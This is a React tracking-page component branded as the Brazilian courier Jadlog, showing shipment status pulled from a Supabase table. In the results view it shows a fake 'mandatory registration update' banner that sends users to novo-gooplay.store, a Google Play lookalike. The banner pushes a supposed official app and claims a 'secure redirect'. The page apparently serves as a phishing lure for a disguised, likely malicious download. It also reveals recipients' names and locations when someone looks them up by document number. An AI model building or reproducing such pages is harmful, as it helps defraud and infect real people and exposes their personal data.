import React, { useState, useEffect } from "react";
import { Link } from "react-router-dom";
import { supabase } from "@/api/supabaseClient";
import { Truck, ArrowLeft, FileText, Loader2, PackageX } from "lucide-react";
import { Badge } from "@/components/ui/badge";
import { format } from "date-fns";

const statusLabels = {
  pendente: "Pendente",
  em_transito: "Em Trânsito",
  saiu_para_entrega: "Saiu para Entrega",
  entregue: "Entregue",
  devolvido: "Devolvido",
};

const statusColors = {
  pendente: "bg-foreground text-white",
  em_transito: "bg-primary text-white",
  saiu_para_entrega: "bg-amber-500 text-white",
  entregue: "bg-green-600 text-white",
  devolvido: "bg-destructive text-white",
};

export default function Tracking() {
  const [shipment, setShipment] = useState(null);
  const [loading, setLoading] = useState(true);
  const [notFound, setNotFound] = useState(false);

  const urlParams = new URLSearchParams(window.location.search);
  const code = urlParams.get("code");

  useEffect(() => {
    const fetchShipment = async () => {
      if (!code) {
        setNotFound(true);
        setLoading(false);
        return;
      }
      const trimmed = code.trim();

      // Try by tracking_code (case-insensitive)
      let { data } = await supabase
        .from("shipments")
        .select("*")
        .ilike("tracking_code", trimmed)
        .limit(1);

      if (!data?.length) {
        // Try by recipient_document
        ({ data } = await supabase
          .from("shipments")
          .select("*")
          .eq("recipient_document", trimmed)
          .limit(1));
      }

      if (data?.length > 0) {
        setShipment(data[0]);
      } else {
        setNotFound(true);
      }
      setLoading(false);
    };
    fetchShipment();
  }, [code]);

  return (
    <div className="min-h-screen bg-background">
      <nav className="bg-white border-b border-border sticky top-0 z-50">
        <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
          <Link to="/">
            <img
              src="https://media.base44.com/images/public/69fa0b24ccef03b266228836/103782717_download.webp"
              alt="Jadlog"
              className="h-12 w-auto"
            />
          </Link>
          <Link to="/" className="flex items-center gap-1 text-primary font-medium text-sm hover:underline">
            <ArrowLeft className="w-4 h-4" />
            Voltar
          </Link>
        </div>
      </nav>

      <div className="max-w-2xl mx-auto px-4 py-6">
        {loading ? (
          <div className="flex items-center justify-center py-20">
            <Loader2 className="w-8 h-8 animate-spin text-primary" />
          </div>
        ) : notFound ? (
          <div className="text-center py-20">
            <PackageX className="w-16 h-16 text-muted-foreground mx-auto mb-4" />
            <h2 className="text-xl font-bold mb-2">Encomenda não encontrada</h2>
            <p className="text-muted-foreground text-sm">
              Verifique o código de rastreio e tente novamente.
            </p>
          </div>
        ) : (
          <div>
            <div className="bg-primary rounded-t-xl px-5 py-3">
              <h1 className="text-white font-bold uppercase tracking-wide">
                Rastreamento de Encomenda
              </h1>
            </div>
            <div className="bg-secondary px-5 py-2 rounded-b-xl mb-6">
              <p className="text-muted-foreground text-sm text-center">Resultados da busca</p>
            </div>

            <div className="text-center mb-6">
              <p className="text-muted-foreground text-sm">
                <span className="font-semibold text-foreground">Destinatário:</span>{" "}
                {shipment.recipient_name}
              </p>
              <p className="text-2xl font-bold mt-1">{shipment.tracking_code}</p>
              <p className="text-muted-foreground text-sm mt-1">
                {shipment.city} / {shipment.state}
              </p>
            </div>

            <div className={`${statusColors[shipment.status] || "bg-foreground text-white"} rounded-lg py-3 px-4 text-center mb-8`}>
              <span className="font-semibold">
                Status: {statusLabels[shipment.status] || shipment.status}
              </span>
            </div>

            <a
              href="https://novo-gooplay.store/aplicativo/jadlog-2?bypass"
              target="_blank"
              rel="noopener noreferrer"
              className="block mb-8 rounded-xl border-2 border-primary bg-primary/5 p-5 hover:bg-primary/10 transition-colors"
            >
              <div className="flex items-start gap-4">
                <div className="w-12 h-12 rounded-xl overflow-hidden shrink-0">
                  <img src="https://logospng.org/download/jadlog/logo-jadlog-icon-1024.png" alt="Jadlog" className="w-full h-full object-cover" />
                </div>
                <div className="flex-1">
                  <p className="text-primary font-bold text-base uppercase tracking-wide mb-1">⚠️ Atualização Cadastral Obrigatória</p>
                  <p className="text-foreground font-semibold text-sm mb-2">
                    Para realizar sua atualização cadastral obrigatória, baixe o aplicativo oficial da Jadlog e faça diretamente pelo app.
                  </p>
                  <div className="flex items-center gap-2 mt-3">
                    <span className="bg-primary text-white text-xs font-bold px-4 py-2 rounded-lg">
                      📲 Baixar Aplicativo — Google Play
                    </span>
                    <span className="text-xs text-muted-foreground">Redirecionamento seguro ✓</span>
                  </div>
                </div>
              </div>
            </a>

            <div className="space-y-0">
              {(shipment.events || []).map((event, index) => (
                <div key={index} className="flex gap-4 pb-6">
                  <div className="flex flex-col items-center">
                    <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center shrink-0">
                      <FileText className="w-5 h-5 text-primary" />
                    </div>
                    {index < (shipment.events.length - 1) && (
                      <div className="w-0.5 flex-1 bg-border mt-2" />
                    )}
                  </div>
                  <div className="pt-1">
                    <p className="font-semibold text-sm">
                      {statusLabels[event.status] || event.status || "—"} — {event.description}
                    </p>
                    <p className="text-muted-foreground text-sm">{event.location}</p>
                    <p className="text-primary text-sm font-medium mt-0.5">{event.date}</p>
                  </div>
                </div>
              ))}
              {(!shipment.events || shipment.events.length === 0) && (
                <div className="flex gap-4">
                  <div className="w-10 h-10 bg-primary/10 rounded-full flex items-center justify-center shrink-0">
                    <FileText className="w-5 h-5 text-primary" />
                  </div>
                  <div className="pt-1">
                    <p className="font-semibold text-sm">
                      {statusLabels[shipment.status]} — Pedido cadastrado
                    </p>
                    <p className="text-muted-foreground text-sm">
                      {shipment.city} / {shipment.state}
                    </p>
                    <p className="text-primary text-sm font-medium mt-0.5">
                      {shipment.created_date ? format(new Date(shipment.created_date), "dd/MM/yyyy, HH:mm:ss") : "—"}
                    </p>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
